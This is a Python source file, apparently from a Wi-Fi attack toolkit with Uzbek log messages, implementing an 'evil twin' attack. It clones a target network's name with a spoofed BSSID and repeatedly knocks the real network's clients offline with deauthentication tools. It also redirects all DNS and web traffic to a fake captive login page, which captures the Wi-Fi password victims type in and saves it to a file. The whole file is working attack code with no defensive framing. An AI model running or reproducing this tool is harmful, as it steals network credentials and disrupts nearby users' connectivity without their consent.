#!/usr/bin/env python3
from __future__ import annotations
import os
import re
import signal
import subprocess
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Optional
from urllib.parse import parse_qs, unquote_plus
import wifi_util as wu
from deauth_engine import DeauthStack, make_stack_for_twin

class EvilTwin:
    AP_IP = '192.168.1.1'
    AP_MASK = '255.255.255.0'
    AP_CIDR = '24'
    DHCP_START = '192.168.1.33'
    DHCP_END = '192.168.1.100'
    NET = '192.168.1.0'

    def __init__(self, config=None, log_callback=None):
        self.config = config or {}
        self.log_callback = log_callback or (lambda x: print(x))
        self._running = False
        self._hostapd = None
        self._dnsmasq = None
        self._httpd = None
        self._http_thr = None
        self.captured_password = None
        self.captured_data = []
        self.portal_port = 80
        self._iface = None
        self._deauth_iface = None
        self._deauth_stack: Optional[DeauthStack] = None
        self._phy = None
        self._portal_essid = 'Wi-Fi'
        self._engine = 'max'
        self._tmpdir = '/tmp/et_max/'
        self._hostapd_conf = os.path.join(self._tmpdir, 'hostapd.conf')
        self._dnsmasq_conf = os.path.join(self._tmpdir, 'dnsmasq.conf')
        self._lease = os.path.join(self._tmpdir, 'dnsmasq.leases')
        self._log_dir = '/tmp/wraithe_logs'
        self._got_dhcp = False
        self._client_macs = []

    def log(self, msg, important: bool=False):
        self.log_callback(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    class _Handler(BaseHTTPRequestHandler):
        parent = None
        protocol_version = 'HTTP/1.0'

        def log_message(self, fmt, *args):
            if self.parent:
                self.parent.log(f'[HTTP] {self.client_address[0]} {fmt % args}')

        def _ap(self):
            return self.parent.AP_IP if self.parent else EvilTwin.AP_IP

        def _essid(self):
            return (self.parent._portal_essid if self.parent else None) or 'Wi-Fi'

        def _host(self):
            return (self.headers.get('Host') or '').split(':')[0].lower()

        def _dev(self):
            ua = (self.headers.get('User-Agent') or '').lower()
            if 'captivenetworksupport' in ua or 'iphone' in ua or 'ipad' in ua:
                return 'iOS'
            if 'dalvik' in ua or 'android' in ua:
                return 'Android'
            if 'windows' in ua:
                return 'Windows'
            if 'macintosh' in ua:
                return 'macOS'
            if 'linux' in ua:
                return 'Linux'
            return '?'

        def _local(self):
            h = self._host()
            ap = self._ap().lower()
            return not h or h == ap or h.startswith('192.168.1.')

        def _redir(self):
            loc = f'http://{self._ap()}/'
            try:
                self.send_response(302)
                self.send_header('Location', loc)
                self.send_header('Content-Length', '0')
                self.send_header('Connection', 'close')
                self.send_header('Cache-Control', 'no-store, no-cache')
                self.send_header('Pragma', 'no-cache')
                self.end_headers()
            except Exception:
                pass
            if self.parent:
                self.parent.log(f"[YO'NALTIRISH] 302 {self._host()}{self.path} → {loc} ({self._dev()})")

        def do_GET(self):
            path = (self.path or '/').split('?')[0]
            low = path.lower()
            if self.parent:
                self.parent.log(f'[HTTP] GET {path} Host={self._host()} qurilma={self._dev()} <- {self.client_address[0]}')
            if 'wpad' in low or low.endswith('favicon.ico'):
                self._send(b'')
                return
            if not self._local():
                self._redir()
                return
            if any((x in low for x in ('generate_204', 'gen_204', 'hotspot-detect', 'ncsi', 'connecttest', 'detectportal', 'success.txt', 'canonical', 'library/test', 'connectivitycheck'))):
                self._redir()
                return
            self._page()

        def do_HEAD(self):
            if not self._local():
                self._redir()
                return
            try:
                self.send_response(200)
                self.send_header('Content-Length', '0')
                self.send_header('Connection', 'close')
                self.end_headers()
            except Exception:
                pass

        def do_POST(self):
            n = int(self.headers.get('Content-Length', 0) or 0)
            body = self.rfile.read(n).decode('utf-8', errors='replace')
            dev = self._dev()
            if self.parent:
                self.parent.log(f'[HTTP] POST qurilma={dev}: {body[:180]}')
                self.parent.captured_data.append({'time': datetime.now().isoformat(), 'ip': self.client_address[0], 'data': body, 'device': dev})
            pwd = None
            keys = ('password', 'pass', 'pwd', 'key', 'parol', 'wifi', 'passwd')
            try:
                for k, v in parse_qs(body).items():
                    if any((x in k.lower() for x in keys)) and v and v[0]:
                        pwd = unquote_plus(v[0])
            except Exception:
                pass
            if pwd and self.parent:
                self.parent.captured_password = pwd
                self.parent.log(f'[!!!] PAROL olindi ({dev}): {pwd}')
                self._send(b'<!DOCTYPE html><html><body><h1>Muvaffaqiyat</h1><p>Ulandi</p></body></html>')
            else:
                self._page()

        def _send(self, data, ctype='text/html; charset=utf-8'):
            if isinstance(data, str):
                data = data.encode('utf-8')
            try:
                self.send_response(200)
                self.send_header('Content-Type', ctype)
                self.send_header('Content-Length', str(len(data)))
                self.send_header('Cache-Control', 'no-store')
                self.send_header('Connection', 'close')
                self.end_headers()
                if data:
                    self.wfile.write(data)
            except Exception:
                pass

        def _page(self):
            ap, essid = (self._ap(), self._essid())
            html = f'<!DOCTYPE html>\n<html><head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">\n<title>Sign in — {essid}</title>\n<style>\nbody{{margin:0;font-family:Arial,sans-serif;background:#e8eef5}}\n.box{{max-width:400px;margin:36px auto;background:#fff;padding:28px 22px;\nborder-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.12)}}\nh1{{font-size:20px;text-align:center;margin:0 0 8px}}\np{{font-size:13px;color:#444;text-align:center;line-height:1.45}}\n.ssid{{color:#0b57d0;font-weight:700}}\ninput,button{{width:100%;padding:14px;font-size:16px;margin:8px 0;box-sizing:border-box;\nborder-radius:8px;border:1px solid #ccc}}\nbutton{{background:#0b57d0;color:#fff;border:0;font-weight:700}}\n.hint{{font-size:11px;color:#888;text-align:center;margin-top:12px}}\n</style></head><body>\n<div class="box">\n<h1>Network Login</h1>\n<p><span class="ssid">{essid}</span><br>\nWi‑Fi parolini kiriting / Enter Wi‑Fi password</p>\n<form method="POST" action="http://{ap}/" autocomplete="off">\n<input name="password" type="password" required placeholder="Password / Parol"\n autocapitalize="off" autocorrect="off" spellcheck="false">\n<button type="submit">Connect / Ulanish</button>\n</form>\n<p class="hint">http://{ap}/</p>\n</div></body></html>'
            self._send(html)

        def handle_one_request(self):
            try:
                super().handle_one_request()
            except Exception:
                pass

    def _start_portal(self, essid: str) -> bool:
        self._portal_essid = essid
        self._Handler.parent = self
        wu.run(['fuser', '-k', '80/tcp'])
        time.sleep(0.2)
        for port in (80, 8080):
            try:
                srv = ThreadingHTTPServer(('0.0.0.0', port), self._Handler)
                srv.allow_reuse_address = True
                self._httpd = srv
                self.portal_port = port
                break
            except OSError as e:
                self.log(f'Portal porti {port}: {e}')
                self._httpd = None
        if not self._httpd:
            return False
        self._http_thr = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._http_thr.start()
        r = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-H', 'Host: connectivitycheck.gstatic.com', f'http://127.0.0.1:{self.portal_port}/generate_204'], capture_output=True, text=True, timeout=5)
        self.log(f"Portal :{self.portal_port} | yo'naltirish tekshiruvi HTTP {(r.stdout or '?').strip()}")
        return True

    def _start_hostapd(self, iface, essid, channel, real_bssid) -> bool:
        ch = wu.normalize_channel(channel)
        fake = wu.fake_bssid(real_bssid) if real_bssid else None
        lines = [f'interface={iface}', 'driver=nl80211', f'ssid={essid}', f'channel={ch}', 'wpa=0', 'ignore_broadcast_ssid=0', 'hw_mode=g', 'auth_algs=1', 'ieee80211n=1', 'wmm_enabled=1', 'beacon_int=100', 'dtim_period=2', 'max_num_sta=32', 'ap_max_inactivity=300', 'disassoc_low_ack=0', 'country_code=US', 'ieee80211d=0']
        if fake:
            lines.append(f'bssid={fake}')
            self.log(f'Soxta BSSID: {fake} (asl {real_bssid})')
        os.makedirs(self._tmpdir, exist_ok=True)
        with open(self._hostapd_conf, 'w') as f:
            f.write('\n'.join(lines) + '\n')
        wu.run(['ip', 'link', 'set', iface, 'down'])
        wu.run(['ip', 'addr', 'flush', 'dev', iface])
        wu.run(['iw', 'dev', iface, 'set', 'type', 'managed'])
        wu.run(['ip', 'link', 'set', iface, 'up'])
        time.sleep(0.35)
        self.log(f'Nuqta nuqta (hostapd): "{essid}" @ {iface} kanal {ch}')
        self._hostapd = subprocess.Popen(['hostapd', self._hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN))
        threading.Thread(target=self._read_hostapd, daemon=True).start()
        for _ in range(30):
            if self._hostapd.poll() is not None:
                err = ''
                try:
                    err = (self._hostapd.stdout.read() or '')[:350]
                except Exception:
                    pass
                self.log(f'hostapd xato: {err[:220]}')
                return False
            if wu.iface_type(iface) == 'AP':
                self.log('hostapd: nuqta yoqildi ✓')
                wu.set_txpower_max(iface, log=self.log)
                return True
            time.sleep(0.3)
        ok = self._hostapd.poll() is None
        if ok:
            wu.set_txpower_max(iface, log=self.log)
        self.log(f"hostapd rejim={wu.iface_type(iface)} ishlayapti={('ha' if ok else 'yoq')}")
        return ok

    def _read_hostapd(self):
        if not self._hostapd or not self._hostapd.stdout:
            return
        try:
            for line in self._hostapd.stdout:
                if not self._running:
                    break
                line = (line or '').strip()
                low = line.lower()
                if any((k in low for k in ('ap-enabled', 'ap-sta-connected', 'ap-sta-disconnected', 'failed', 'error', 'could not'))):
                    self.log(f'[NUQTA] {line[:140]}')
                if 'ap-sta-connected' in low:
                    for m in re.findall('(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line):
                        u = m.upper()
                        if u not in self._client_macs:
                            self._client_macs.append(u)
                    self.log('[+] Mijoz ulandi — DHCP kutilmoqda')
        except Exception:
            pass

    def _setup_ip(self, iface) -> bool:
        try:
            with open(f'/proc/sys/net/ipv6/conf/{iface}/disable_ipv6', 'w') as f:
                f.write('1')
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
        except Exception:
            pass
        for p in (f'/proc/sys/net/ipv4/conf/{iface}/rp_filter', '/proc/sys/net/ipv4/conf/all/rp_filter'):
            try:
                with open(p, 'w') as f:
                    f.write('0')
            except Exception:
                pass
        wu.run(['ip', 'link', 'set', iface, 'up'])
        wu.run(['ip', 'addr', 'flush', 'dev', iface])
        time.sleep(0.15)
        wu.run(['ip', 'addr', 'add', f'{self.AP_IP}/{self.AP_CIDR}', 'dev', iface])
        wu.run(['ip', 'link', 'set', iface, 'up'])
        wu.run(['ip', 'route', 'replace', f'{self.NET}/{self.AP_CIDR}', 'dev', iface])
        _, out, _ = wu.run_out(['ip', '-4', 'addr', 'show', 'dev', iface])
        ok = self.AP_IP in out
        self.log(f"IP {self.AP_IP} @ {iface}: {('tayyor' if ok else 'xato')}")
        return ok

    def _start_dnsmasq(self, iface) -> bool:
        wu.run(['pkill', '-x', 'dnsmasq'])
        time.sleep(0.3)
        conf = f'# MAX captive DNS+DHCP\ninterface={iface}\nbind-dynamic\nexcept-interface=lo\ndhcp-range={self.DHCP_START},{self.DHCP_END},{self.AP_MASK},1h\ndhcp-option=option:router,{self.AP_IP}\ndhcp-option=option:dns-server,{self.AP_IP}\ndhcp-option=option:netmask,{self.AP_MASK}\ndhcp-option=114,http://{self.AP_IP}/\ndhcp-option-force=114,http://{self.AP_IP}/\ndhcp-option=160,http://{self.AP_IP}/\ndhcp-option=252,"http://{self.AP_IP}/wpad.dat"\ndhcp-authoritative\ndhcp-leasefile={self._lease}\ndhcp-broadcast\naddress=/#/{self.AP_IP}\nport=53\nno-resolv\nno-hosts\nlog-dhcp\nlog-queries\n'
        with open(self._dnsmasq_conf, 'w') as f:
            f.write(conf)
        open(self._lease, 'w').close()
        self._dnsmasq = subprocess.Popen(['dnsmasq', '-C', self._dnsmasq_conf, '-d', '--log-facility=-'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN))
        time.sleep(1.0)
        if self._dnsmasq.poll() is not None:
            err = ''
            try:
                err = (self._dnsmasq.stdout.read() or '')[:300]
            except Exception:
                pass
            self.log(f'dnsmasq xato: {err}')
            return False
        threading.Thread(target=self._read_dns, daemon=True).start()
        self.log(f'DHCP/DNS (dnsmasq) ishga tushdi @ {iface}')
        return True

    def _read_dns(self):
        if not self._dnsmasq or not self._dnsmasq.stdout:
            return
        try:
            for line in self._dnsmasq.stdout:
                if not self._running:
                    break
                line = (line or '').strip()
                if not line:
                    continue
                low = line.lower()
                if 'dhcp' in low or 'ack' in low or 'offer' in low:
                    self.log(f'[DHCP] {line[:130]}')
                    for m in re.findall('(?:[0-9a-f]{2}:){5}[0-9a-f]{2}', low):
                        u = m.upper()
                        if u not in self._client_macs:
                            self._client_macs.append(u)
                if 'dhcpack' in low.replace(' ', ''):
                    self._got_dhcp = True
                    self.log(f'[!!!] DHCP berildi → http://{self.AP_IP}/')
        except Exception:
            pass

    def _iptables(self, iface):
        wu.run(['iptables', '-t', 'nat', '-F'])
        wu.run(['iptables', '-t', 'mangle', '-F'])
        wu.run(['iptables', '-F'])
        wu.run(['iptables', '-P', 'FORWARD', 'DROP'])
        wu.run(['iptables', '-P', 'INPUT', 'ACCEPT'])
        port = str(self.portal_port)
        for rule in (['-A', 'INPUT', '-i', iface, '-p', 'udp', '--dport', '67:68', '-j', 'ACCEPT'], ['-A', 'INPUT', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'], ['-A', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'], ['-A', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', port, '-j', 'ACCEPT']):
            wu.run(['iptables'] + rule)
        for proto in ('udp', 'tcp'):
            wu.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', proto, '--dport', '53', '-j', 'DNAT', '--to-destination', f'{self.AP_IP}:53'])
        for dport in ('80', '443', '8080', '8000', '8443', '3128'):
            wu.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', dport, '-j', 'DNAT', '--to-destination', f'{self.AP_IP}:{port}'])
        for dport in ('853', '784', '8853'):
            wu.run(['iptables', '-A', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', dport, '-j', 'REJECT'])
            wu.run(['iptables', '-A', 'FORWARD', '-i', iface, '-p', 'udp', '--dport', dport, '-j', 'DROP'])
        wu.run(['iptables', '-A', 'FORWARD', '-i', iface, '-j', 'DROP'])
        self.log("Captive qoidalar o'rnatildi (80/443 va boshqalar)")

    def _lease_macs(self):
        macs = list(self._client_macs)
        try:
            if os.path.exists(self._lease):
                with open(self._lease) as f:
                    for line in f:
                        p = line.split()
                        if len(p) >= 2 and re.match('([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', p[1]):
                            u = p[1].upper()
                            if u not in macs:
                                macs.append(u)
        except Exception:
            pass
        if self._deauth_stack:
            for m in self._deauth_stack.tracker.list():
                if m not in macs:
                    macs.append(m)
        return macs

    def _status(self):
        try:
            if os.path.exists(self._lease):
                with open(self._lease) as f:
                    rows = [x.strip() for x in f if x.strip()]
                if rows:
                    self.log(f'DHCP mijozlar: {len(rows)}')
                    for r in rows[-5:]:
                        self.log(f'  {r}')
                    self.log(f'→ http://{self.AP_IP}/')
        except Exception:
            pass
        if self._deauth_stack:
            st = self._deauth_stack.stats
            self.log(f"Uzish: mijozlar={self._deauth_stack.tracker.count()} efir={st['broadcast']} yo'naltirilgan={st['directed']} mdk4={st['mdk4']} raund={st['rounds']}")
        if not self._got_dhcp:
            self.log("DHCP yo'q | 1) SSID ni unuting 2) ochiq twin ga ulaning 3) yaqinroq turing")

    def _save(self, essid, bssid):
        os.makedirs(self._log_dir, exist_ok=True)
        path = os.path.join(self._log_dir, f'et_{int(time.time())}.txt')
        with open(path, 'w', encoding='utf-8') as f:
            f.write(f'SSID: {essid}\nBSSID: {bssid}\n')
            f.write(f'Parol: {self.captured_password}\n')
            f.write(f'Data: {self.captured_data}\n')
        self.log(f'Saqlandi: {path}')
        return path

    def _start_deauth_stack(self, mon: str, bssid: str, ch: int) -> bool:
        if not mon or not wu.iface_exists(mon):
            return False
        wu.set_channel(mon, ch, force_raw=True)
        wu.set_txpower_max(mon, log=self.log)
        self._deauth_iface = mon
        self._deauth_stack = make_stack_for_twin(mon, bssid, ch, log=self.log, seed_clients=self._client_macs)

        def _sync_seed():
            while self._running and self._deauth_stack:
                self._deauth_stack.seed_clients(self._lease_macs())
                time.sleep(5)
        threading.Thread(target=_sync_seed, daemon=True).start()
        self._deauth_stack.start_continuous()
        self.log(f'[+] Uzish steki ishga tushdi @ {mon}')
        return True

    def run(self, mon_iface, essid, bssid, channel='6', timeout=0, continuous_deauth=True, ap_essid=None, deauth_channel=None, **_kw):
        self.captured_password = None
        self.captured_data = []
        self._got_dhcp = False
        self._client_macs = []
        self._running = True
        self._deauth_stack = None
        name = (ap_essid or essid or 'Wi-Fi').strip().strip('"')
        while name.endswith(','):
            name = name[:-1].rstrip()
        name = name.strip()
        if not name or str(name).startswith('<'):
            name = 'Wi-Fi'
        ch = wu.normalize_channel(channel)
        try:
            dch = int(deauth_channel) if deauth_channel is not None else int(channel)
        except (TypeError, ValueError):
            dch = ch
        self.log(f'=== SOXTA WI-FI: "{name}" AP-kanal={ch} uzish-kanal={dch} ===')
        self.log(f"Tizim: {wu.detect_distro()} | mdk4={('bor' if wu.which('mdk4') else 'yoq')} | aireplay={('bor' if wu.which('aireplay-ng') else 'yoq')}")
        wu.airgeddon_check_kill(log=self.log, iface=None)
        wu.cleanup_p2p_at0(log=self.log)
        os.makedirs(self._tmpdir, exist_ok=True)
        ap_base, deauth_base = wu.split_ap_deauth_ifaces(mon_iface)
        if not ap_base:
            ap_base = wu.resolve_station(mon_iface, log=self.log)
        if not ap_base:
            ap_base = wu.ensure_ap_iface(mon_iface, log=self.log)
        if not ap_base:
            found = ', '.join(wu.list_net_ifaces())
            self.stop()
            return {'success': False, 'error': f'Wi‑Fi topilmadi ({found})'}
        remembered = wu.base_name(ap_base)
        self.log(f'Nuqta kartasi: {ap_base}' + (f' | Uzish kartasi: {deauth_base}' if deauth_base else " | Uzish: qo'shimcha monitor"))
        mon_used = None
        if continuous_deauth and bssid:
            if deauth_base:
                mon_used = wu.airmon_start(deauth_base, log=self.log)
            else:
                mon_used = wu.airmon_start(ap_base, log=self.log)
            if mon_used:
                stack = make_stack_for_twin(mon_used, bssid, dch, log=self.log)
                self.log('[*] Dastlabki uzish 5s...')
                stack.burst(seconds=5)
                clients_found = stack.tracker.list()
                self._client_macs = list(clients_found)
                self.log(f'Dastlabki uzish tayyor · {len(clients_found)} mijoz · keyin nuqta...')
                stack.stop()
                wu.run(['pkill', '-x', 'aireplay-ng'])
                wu.run(['pkill', '-x', 'mdk4'])
                time.sleep(0.3)
                if not deauth_base:
                    ap_base = wu.ensure_ap_iface(preferred=remembered, mon=mon_used, log=self.log)
                    self._deauth_iface = None
                    mon_used = None
                else:
                    self._deauth_iface = mon_used
            else:
                self.log("Dastlabki uzish uchun monitor yo'q")
        if not ap_base or not wu.iface_exists(ap_base):
            ap_base = wu.ensure_ap_iface(preferred=remembered, mon=mon_used, log=self.log)
        if not ap_base or not wu.iface_exists(ap_base):
            ap_base = wu.recreate_station(remembered, log=self.log)
        if not ap_base or not wu.iface_exists(ap_base):
            found = ', '.join(wu.list_net_ifaces())
            self.stop()
            return {'success': False, 'error': f"Nuqta interfeysi yo'qoldi ({found}). Qayta: bosh menyu → Tarmoqni tiklash"}
        wu.run(['nmcli', 'device', 'set', ap_base, 'managed', 'no'])
        wu.run(['ip', 'link', 'set', ap_base, 'down'])
        wu.run(['iw', 'dev', ap_base, 'set', 'type', 'managed'])
        wu.run(['ip', 'addr', 'flush', 'dev', ap_base])
        wu.run(['ip', 'link', 'set', ap_base, 'up'])
        time.sleep(0.3)
        self._iface = ap_base
        self._phy = wu.find_phy(ap_base)
        self.log(f'Nuqta interfeysi: {ap_base} phy={self._phy} rejim={wu.iface_type(ap_base)}')
        if not self._start_portal(name):
            self.stop()
            return {'success': False, 'error': 'Portal ochilmadi'}
        if not self._start_hostapd(ap_base, name, ch, bssid):
            self.stop()
            return {'success': False, 'error': 'Nuqta (hostapd) ishlamadi'}
        if not self._setup_ip(ap_base):
            self.stop()
            return {'success': False, 'error': "IP o'rnatilmadi"}
        if not self._start_dnsmasq(ap_base):
            self.stop()
            return {'success': False, 'error': 'DHCP/DNS ishlamadi'}
        self._iptables(ap_base)
        if continuous_deauth and bssid:
            mon = self._deauth_iface
            if mon and wu.iface_exists(mon) and (wu.iface_type(mon) == 'monitor'):
                pass
            elif deauth_base and wu.iface_exists(deauth_base):
                mon = wu.airmon_start(deauth_base, log=self.log)
            else:
                mon = wu.add_monitor_vif(self._phy, ch, log=self.log)
            if mon:
                self._start_deauth_stack(mon, bssid, dch)
            else:
                self.log("[!] Uzish monitori yo'q — soxta Wi-Fi ishlaydi, mijoz o'zi ulanishi kerak")
        dual = '2 KARTA' if deauth_base else '1 KARTA + monitor'
        print(f"\n  ╔════════════════════════════════════════════════════╗\n  ║  SOXTA WI-FI + UZISH                               ║\n  ╠════════════════════════════════════════════════════╣\n  ║  Rejim   : {dual:<36} ║\n  ║  SSID    : {name[:36]:<36} ║\n  ║  Nuqta   : {ap_base:<36} ║\n  ║  Uzish   : {self._deauth_iface or '—':<36} ║\n  ║  Vositalar: aireplay + mdk4 + mijoz MAC            ║\n  ║  Portal  : http://{self.AP_IP}/{'':<24} ║\n  ╠════════════════════════════════════════════════════╣\n  ║  1) SSID ni UNUTING                                ║\n  ║  2) Yaqin turing + ochiq twin                      ║\n  ║  3) DHCP / portal / uzish ishlayotganini kuting    ║\n  ║  Ctrl+C = to'xtatish                               ║\n  ╚════════════════════════════════════════════════════╝\n")
        self.log('Soxta Wi-Fi + uzish steki tayyor')
        start = time.time()
        try:
            while self._running:
                if timeout and time.time() - start >= timeout:
                    break
                time.sleep(1)
                if self.captured_password:
                    print(f'\n  *** PAROL: {self.captured_password} ***\n')
                    fp = self._save(name, bssid)
                    self.stop()
                    return {'success': True, 'password': self.captured_password, 'essid': name, 'bssid': bssid, 'data': self.captured_data, 'file': fp, 'engine': self._engine}
                el = int(time.time() - start)
                if el and el % 10 == 0:
                    self._status()
                    _, out, _ = wu.run_out(['ip', '-4', 'addr', 'show', 'dev', ap_base])
                    if self.AP_IP not in out:
                        self._setup_ip(ap_base)
                    if self._hostapd and self._hostapd.poll() is not None:
                        self.log("hostapd to'xtadi — qayta ishga tushirilmoqda")
                        self._start_hostapd(ap_base, name, ch, bssid)
                        self._setup_ip(ap_base)
                    self.log(f'... {el} soniya')
        except KeyboardInterrupt:
            self.log("Ctrl+C — foydalanuvchi to'xtatdi")
        self.stop()
        return {'success': False, 'password': None, 'essid': name, 'bssid': bssid, 'data': self.captured_data, 'engine': self._engine}

    def stop(self):
        self._running = False
        if self._deauth_stack:
            try:
                self._deauth_stack.stop()
            except Exception:
                pass
            self._deauth_stack = None
        wu.run(['pkill', '-x', 'aireplay-ng'])
        wu.run(['pkill', '-x', 'mdk4'])
        if self._httpd:
            try:
                self._httpd.shutdown()
            except Exception:
                pass
            try:
                self._httpd.server_close()
            except Exception:
                pass
            self._httpd = None
        if self._dnsmasq:
            try:
                self._dnsmasq.terminate()
                self._dnsmasq.wait(timeout=2)
            except Exception:
                try:
                    self._dnsmasq.kill()
                except Exception:
                    pass
            self._dnsmasq = None
        wu.run(['pkill', '-x', 'dnsmasq'])
        if self._hostapd:
            try:
                self._hostapd.terminate()
                self._hostapd.wait(timeout=3)
            except Exception:
                try:
                    self._hostapd.kill()
                except Exception:
                    pass
            self._hostapd = None
        wu.run(['pkill', '-x', 'hostapd'])
        if self._deauth_iface:
            if str(self._deauth_iface).startswith('mon'):
                wu.del_iface(self._deauth_iface)
            else:
                wu.to_managed(self._deauth_iface)
            self._deauth_iface = None
        if self._iface and wu.iface_exists(self._iface):
            wu.run(['ip', 'addr', 'flush', 'dev', self._iface])
            wu.to_managed(self._iface)
        wu.run(['iptables', '-t', 'nat', '-F'])
        wu.run(['iptables', '-t', 'mangle', '-F'])
        wu.run(['iptables', '-F'])
        wu.run(['iptables', '-P', 'FORWARD', 'ACCEPT'])
        self.log("Soxta Wi-Fi va uzish to'xtatildi")

    def is_running(self):
        return self._running

def run_infinite_deauth(mon_iface, bssid, channel=None, log=print):
    from deauth_engine import run_infinite_deauth as _run
    _run(mon_iface, bssid, channel=channel, log=log)
if __name__ == '__main__':
    print('sudo python3 main.py')
